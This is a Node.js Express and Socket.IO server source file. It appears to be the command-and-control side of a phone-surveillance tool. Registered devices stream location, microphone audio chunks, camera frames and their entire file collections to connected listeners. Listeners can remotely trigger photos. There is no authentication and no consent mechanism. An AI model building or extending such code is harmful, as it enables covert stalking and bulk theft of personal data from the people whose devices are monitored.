const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const path = require("path");

const PORT = process.env.PORT || 5000;
const app = express();
const server = http.createServer(app);

const io = new Server(server, {
  cors: { origin: "*" },
});

// Serve the dashboard UI from /public
app.use(express.static(path.join(__dirname, "public")));

// Track devices and listeners
const devices = new Map();    // Map socket.id -> device info
const listeners = new Set();

// Socket.IO connections
io.on("connection", (socket) => {
  console.log(`🔌 Client connected: ${socket.id}`);

  // Device registration
  socket.on("device-register", () => {
    devices.set(socket.id, { id: socket.id, lastActive: Date.now() });
    console.log(`📱 Device registered: ${socket.id}`);
  });

  // Listener registration
  socket.on("listener-register", () => {
    listeners.add(socket.id);
    console.log(`🖥️ Listener registered: ${socket.id}`);
  });

  // Forward location updates
  socket.on("location-update", (data) => {
    // Update lastActive timestamp
    if (devices.has(socket.id)) devices.get(socket.id).lastActive = Date.now();
    listeners.forEach((id) => io.to(id).emit("location-update", { deviceId: socket.id, ...data }));
  });

  // Forward audio chunks
  socket.on("audio-chunk", (chunk) => {
    if (devices.has(socket.id)) devices.get(socket.id).lastActive = Date.now();
    listeners.forEach((id) => io.to(id).emit("audio-chunk", { deviceId: socket.id, chunk }));
  });

  // Forward camera frames
  socket.on("camera-frame", (base64Image) => {
    if (devices.has(socket.id)) devices.get(socket.id).lastActive = Date.now();
    listeners.forEach((id) => io.to(id).emit("camera-frame", { deviceId: socket.id, frame: base64Image }));
  });

  // Forward all files from device
  socket.on("all-files", (filesArray) => {
    if (devices.has(socket.id)) devices.get(socket.id).lastActive = Date.now();
    listeners.forEach((id) => io.to(id).emit("all-files", { deviceId: socket.id, files: filesArray }));
    console.log(`📁 Received ${filesArray.length} files from ${socket.id}`);
  });

  // Listener request: trigger camera capture on device
  socket.on("request-camera", (deviceId) => {
    if (devices.has(deviceId)) {
      io.to(deviceId).emit("take-photo");
      console.log(`📸 Requested camera capture from ${deviceId}`);
    }
  });

  // Handle disconnect
  socket.on("disconnect", () => {
    devices.delete(socket.id);
    listeners.delete(socket.id);
    console.log(`❌ Client disconnected: ${socket.id}`);
  });
});

// Endpoint to list active devices (optional)
app.get("/devices", (req, res) => {
  const activeDevices = Array.from(devices.values());
  res.json(activeDevices);
});

server.listen(PORT, () => {
  console.log(`🚀 Server listening on port ${PORT}`);
});
